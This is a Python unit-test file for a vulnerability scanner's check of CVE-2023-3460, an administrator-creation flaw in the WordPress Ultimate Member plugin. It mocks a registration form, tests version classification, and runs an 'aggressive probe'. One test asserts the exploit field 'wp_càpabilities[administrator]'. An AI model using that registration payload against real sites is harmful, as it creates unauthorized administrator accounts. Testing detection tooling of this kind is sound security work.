import unittest
from unittest.mock import patch

from proofcms.modules.wordpress import cve_2023_3460

REGISTER_HTML = """
<form method="post" action="">
  <input type="hidden" name="form_id" id="form_id_5" value="5" />
  <input type="hidden" id="_wpnonce" name="_wpnonce" value="nonce123" />
  <input type="text" name="user_login-5" />
  <input type="text" name="first_name-5" />
  <input type="text" name="last_name-5" />
  <input type="email" name="user_email-5" />
  <input type="password" name="user_password-5" />
  <input type="password" name="confirm_user_password-5" />
  <div class="um-form" data-mode="register"></div>
</form>
"""


class FakeSession:
    def __init__(self, *, register=True, admin=True, users=True, plain_permalinks=False):
        self.register = register
        self.admin = admin
        self.users = users
        self.plain_permalinks = plain_permalinks
        self.posts = []

    def get(self, url, headers=None, timeout=None):
        if "wp-json/wp/v2/pages" in url:
            return {"status": 404, "body": ""}
        if "rest_route=/wp/v2/pages" in url:
            if self.plain_permalinks and self.register:
                body = '[{"id":11,"link":"https://target.test/?page_id=11"}]'
                return {"status": 200, "body": body}
            return {"status": 404, "body": ""}
        standard_paths = ("/register/", "/index.php/register/", "/registration/", "/signup/")
        if self.plain_permalinks and url in standard_paths:
            return {"status": 404, "body": ""}
        if self.register and (
            url in standard_paths or url in ("/?page_id=11", "https://target.test/?page_id=11")
        ):
            return {"status": 200, "body": REGISTER_HTML}
        if url == "/wp-admin/":
            return {"status": 200 if self.admin else 302, "body": "Dashboard" if self.admin else ""}
        if url == "/wp-admin/users.php":
            return {"status": 200 if self.users else 403, "body": "Add New User" if self.users else "Denied"}
        return {"status": 404, "body": ""}

    def post(self, url, data=None, fields=None, files=None, headers=None, timeout=None):
        self.posts.append((url, fields or {}))
        if url == "/register/" or "page_id=11" in url:
            return {"status": 200, "body": "Your account has been created successfully."}
        if url == "/wp-login.php":
            return {"status": 200, "body": "Dashboard"}
        return {"status": 404, "body": ""}


class TestUltimateMemberVersionPolicy(unittest.TestCase):
    def test_version_boundary(self):
        self.assertEqual(cve_2023_3460.classify_version("2.6.6"), "LIKELY_VULNERABLE")
        self.assertEqual(cve_2023_3460.classify_version("2.6.7"), "PATCHED")
        self.assertEqual(cve_2023_3460.classify_version(None), "DETECTED_VERSION_UNKNOWN")


class TestUltimateMemberFormParsing(unittest.TestCase):
    def test_extracts_nonce_form_id_and_field_names(self):
        details = cve_2023_3460._form_details(REGISTER_HTML)
        self.assertIsNotNone(details)
        assert details is not None
        self.assertEqual(details["nonce"], "nonce123")
        self.assertEqual(details["form_id"], "5")
        self.assertEqual(details["login"], "user_login-5")
        self.assertEqual(details["email"], "user_email-5")
        self.assertEqual(details["password"], "user_password-5")
        self.assertEqual(details["confirm"], "confirm_user_password-5")


class TestUltimateMemberAggressiveProbe(unittest.TestCase):
    def test_creates_administrator_and_confirms(self):
        fake = FakeSession()
        with patch.object(cve_2023_3460, "HttpSession", return_value=fake):
            result = cve_2023_3460.run_aggressive_probe("https://target.test")
        self.assertEqual(result.status, "VULNERABLE")
        self.assertEqual(result.confidence, "CONFIRMED")
        self.assertTrue(result.exploit_ran)
        assert result.evidence is not None
        self.assertTrue(result.evidence["created_username"].startswith("pocum"))
        register_fields = next(fields for url, fields in fake.posts if url == "/register/")
        self.assertEqual(register_fields["wp_c\u00e0pabilities[administrator]"], "1")
        self.assertEqual(register_fields["form_id"], "5")
        self.assertEqual(register_fields["_wpnonce"], "nonce123")

    def test_discovers_registration_page_with_plain_permalinks(self):
        fake = FakeSession(plain_permalinks=True)
        with patch.object(cve_2023_3460, "HttpSession", return_value=fake):
            result = cve_2023_3460.run_aggressive_probe("https://target.test")
        self.assertEqual(result.status, "VULNERABLE")
        self.assertIn("page_id=11", result.proof_url or "")

    def test_missing_registration_form_is_not_confirmed(self):
        fake = FakeSession(register=False)
        with patch.object(cve_2023_3460, "HttpSession", return_value=fake):
            result = cve_2023_3460.run_aggressive_probe("https://target.test")
        self.assertEqual(result.status, "NOT_CONFIRMED")
        self.assertIn("No Ultimate Member registration form", result.detail)

    def test_registration_without_admin_access_is_not_confirmed(self):
        fake = FakeSession(admin=False, users=False)
        with patch.object(cve_2023_3460, "HttpSession", return_value=fake):
            result = cve_2023_3460.run_aggressive_probe("https://target.test")
        self.assertEqual(result.status, "NOT_CONFIRMED")
        self.assertIn("administrator access was not verified", result.detail)


class TestUltimateMemberCheckGate(unittest.TestCase):
    def test_patched_version_skips_aggressive_probe(self):
        plugins = {"ultimate-member": {"found": True, "version": "2.6.7"}}
        with patch.object(cve_2023_3460, "run_aggressive_probe") as probe:
            result = cve_2023_3460.check(
                "https://target.test",
                run_exploit_check=True,
                exploit_mode="aggressive",
                plugins=plugins,
            )
        self.assertEqual(result.status, "PATCHED")
        self.assertFalse(result.exploit_ran)
        probe.assert_not_called()


if __name__ == "__main__":
    unittest.main()
